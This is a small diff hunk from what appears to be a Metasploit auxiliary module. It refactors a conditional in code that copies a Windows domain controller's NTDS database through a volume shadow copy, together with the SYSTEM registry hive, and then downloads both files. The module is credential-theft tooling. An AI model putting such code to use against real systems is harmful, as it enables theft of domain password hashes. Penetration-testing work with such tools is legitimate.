@@ -88,7 +88,7 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 			if vscpath
-				if !(n = copy_ntds(@ip, vscpath, text)) == false && !(s = copy_sys_hive(@ip)) == false
+				if copy_ntds(@ip, vscpath, text) and copy_sys_hive(@ip)
 					download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"), @ip)
 					download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"), @ip)
 				else
